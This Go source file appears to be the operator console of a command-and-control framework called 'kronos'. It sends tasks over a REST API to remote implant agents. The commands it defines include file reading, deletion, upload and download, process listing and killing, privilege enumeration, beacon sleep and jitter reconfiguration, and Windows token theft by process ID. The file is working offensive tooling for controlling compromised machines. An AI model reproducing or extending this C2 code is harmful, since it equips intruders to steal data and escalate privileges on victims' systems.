package cli

import (
	"encoding/json"
	"fmt"
	"strings"

	"github.com/z3vxo/kronos/internal/ui"
	//"github.com/z3vxo/kronos/internal/payloadgen"
)

var CmdCodeMap = map[string]int{
	"proc-list":      0,
	"cmd":       1,
	"cat":       2,
	"ls":        3,
	"rm":        4,
	"mv":        5,
	"pwd":       6,
	"cd":        7,
	"cp":        8,
	"rmdir":     9,
	"get-privs": 10,
	"mkdir":     11,
	"download":  12,
	"upload":    13,
	"reconfig":  14,
	"proc-kill": 15,
	"token-steal": 16,
}

func (c *CLI) requireAgent() bool {
	if c.ClientInUse == "" {
		c.ui.Send(ui.BAD.Sprint("Must be using agent"))
		return false
	}
	return true
}

func (c *CLI) sendTask(cmd string, param1 string, param2, DataType string) bool {
	payload := TaskEntry{
		Guid:     c.ClientInUse,
		Cmd_type: CmdCodeMap[cmd],
		Param1:   param1,
		Param2:   param2,
		DataType: DataType,
	}

	data, err := json.Marshal(&payload)
	if err != nil {
		c.ui.Send(ui.BAD.Sprintf("Failed marshaling json: %s", err))
		return false
	}

	if err := c.http.DoPost("ts/rest/tasks/new", data, nil); err != nil {
		c.ui.Send(ui.WARN.Sprintf("Failed Inserting command: %s", err))
		return false
	}

	c.ui.PrintTitle(fmt.Sprintf("Tasked %s", c.ui.InUse))
	return true
}

func (c *CLI) HandleRMDIR(args []string) {
	if !c.requireAgent() {
		return
	}
	if len(args) == 0 {
		c.ui.Send(ui.BAD.Sprint("Usage: rmdir <dir>"))
		return
	}
	c.sendTask("rmdir", strings.Join(args, " "), "", "string")
}

func (c *CLI) HandleLS(args []string) {
	if !c.requireAgent() {
		return
	}
	var dir string
	if len(args) == 0 {
		dir = "."
	} else {
		dir = strings.Join(args, " ")
	}

	c.sendTask("ls", dir, "", "string")
}

func (c *CLI) HandleMKDIR(args []string) {
	if !c.requireAgent() {
		return
	}
	if len(args) == 0 {
		c.ui.Send(ui.BAD.Sprint("Usage: mkdir <dir>"))
		return
	}
	c.sendTask("mkdir", strings.Join(args, " "), "", "string")
}

func (c *CLI) HandleGETPRIVS(args []string) {
	if !c.requireAgent() {
		return
	}

	c.sendTask("get-privs", "", "", "")
}

func (c *CLI) HandleRM(args []string) {
	if !c.requireAgent() {
		return
	}
	if len(args) == 0 {
		c.ui.Send(ui.BAD.Sprint("Usage: rm <file>"))
		return
	}
	c.sendTask("rm", strings.Join(args, " "), "", "string")
}

func (c *CLI) HandleCAT(args []string) {
	if !c.requireAgent() {
		return
	}
	if len(args) == 0 {
		c.ui.Send(ui.BAD.Sprint("Usage: cat <file>"))
		return
	}
	c.sendTask("cat", strings.Join(args, " "), "", "string")
}

func (c *CLI) HandlePROC(args []string) {
	if !c.requireAgent() {
		return
	}

	sub := args[0]
	switch sub {
	case "list":
		c.sendTask("proc-list", "", "", "")
		break
	case "kill":
		c.sendTask("proc-kill", args[1], "", "int")
		break
	default:
		c.ui.Send(ui.WARN.Sprint("Unknown subcommand"))
	}
}

func (c *CLI) HandlePWD(args []string) {
	if !c.requireAgent() {
		return
	}

	c.sendTask("pwd", "", "", "")
}

func (c *CLI) HandleCD(args []string) {
	if !c.requireAgent() {
		return
	}
	if len(args) != 1 {
		c.ui.Send(ui.BAD.Sprint("Usage: cd <dir>"))
		return
	}

	c.sendTask("cd", args[0], "", "string")
}

func (c *CLI) HandleCP(args []string) {
	if !c.requireAgent() {
		return
	}
	if len(args) != 2 {
		c.ui.Send(ui.BAD.Sprint("Usage: cp <old> <new>"))
		return
	}

	c.sendTask("cp", args[0], args[1], "string")
}

func (c *CLI) HandleMV(args []string) {
	if !c.requireAgent() {
		return
	}
	if len(args) != 2 {
		c.ui.Send(ui.BAD.Sprint("Usage: mv <src> <dst>"))
		return
	}

	c.sendTask("mv", args[0], args[1], "string")
}


func (c *CLI) HandleReconfig(args []string) {
	if !c.requireAgent() {
		return
	}

	if len(args) != 2 {
		c.ui.Send(ui.BAD.Sprint("Usage: reconfig <sleep> <jitter>"))
		return
	}

	c.sendTask("reconfig", args[0], args[1], "int")
}


func (c *CLI) HandleToken(args []string) {
	if !c.requireAgent() {
		return
	}
	if len(args) != 2 {
		c.ui.Send(ui.BAD.Sprint("Usage: token steal <pid> | list | revert"))
		return
	}

	action := args[0]
	switch action {
	case "steal":
		c.sendTask("token-steal", args[1], "", "int")
	default:
		c.ui.Send(ui.WARN.Sprint("Unknown subcommand"))
	}
}



